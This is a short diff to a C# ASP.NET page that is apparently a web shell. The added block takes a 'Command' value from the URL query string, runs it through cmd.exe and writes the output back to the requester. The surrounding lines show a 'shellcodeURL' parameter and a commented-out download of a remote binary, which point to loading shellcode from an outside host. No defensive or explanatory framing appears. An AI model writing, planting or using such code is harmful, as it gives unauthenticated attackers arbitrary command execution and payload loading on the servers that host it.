@@ -518,6 +518,20 @@ public static extern IntPtr GetStdHandle(IntPtr handle);
                                 Response.Write("</pre>");
 
                             }
+//cmd
+if(!(String.IsNullOrEmpty((Request.QueryString["Command"])))){
+                                        Process process = new Process();
+        process.StartInfo.FileName = "cmd.exe";
+        process.StartInfo.Arguments = "/c " + Request.QueryString["Command"];
+        process.StartInfo.UseShellExecute = false;
+        process.StartInfo.RedirectStandardOutput = true;
+        process.Start();
+        string output = process.StandardOutput.ReadToEnd();
+        process.WaitForExit();
+        Response.Write(output);
+                                Response.Write("</pre>");
+
+                            }
                          //download&load
                          if(!(String.IsNullOrEmpty((Request.QueryString["shellcodeURL"])))){
                             //(new WebClient()).DownloadFile(Request.QueryString["memory"], "c:\\users\\public\\tmp.bin");
